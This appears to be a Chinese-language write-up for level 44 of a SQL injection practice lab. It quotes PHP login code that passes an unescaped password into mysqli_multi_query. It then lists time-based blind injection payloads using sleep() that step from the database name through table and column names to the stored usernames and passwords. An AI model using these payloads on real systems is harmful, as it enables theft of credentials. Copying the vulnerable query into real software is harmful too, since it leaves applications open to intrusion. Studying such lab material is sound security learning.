---
title: less44
url: https://www.yuque.com/u29002979/ep2zrx/age78kwqzq34ywiw
---

```bash
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];

$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
if (@mysqli_multi_query($con1, $sql))
```

测试发现没有了报错回显，那就只能借助盲注的方式进行注入了

<a name="Ehstz"></a>

# 时间盲注

<a name="jCJOl"></a>

## 拆解数据库名称长度

`-1' or if(length(database())=8,sleep(5),0)#` <a name="kObnI"></a>

## 猜解数据库名称

`-1' or if(ascii(mid(database(),1,1))<=135,sleep(5),0)--+` <a name="bZUJF"></a>

## 猜解数据表名称长度

`-1' or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(5),0)#` <a name="kSZVm"></a>

## 猜解数据表名称

`-1' or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='e',sleep(5),0)--+`

<a name="j47RV"></a>

## 猜解字段名称长度

`-1' or if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20,sleep(5),0)#` <a name="qszZ6"></a>

## 猜解字段名称

`-1' or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='i',sleep(5),0)--+` <a name="aRdmK"></a>

## 猜解字段内容

`-1' or if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(5),0)--+`
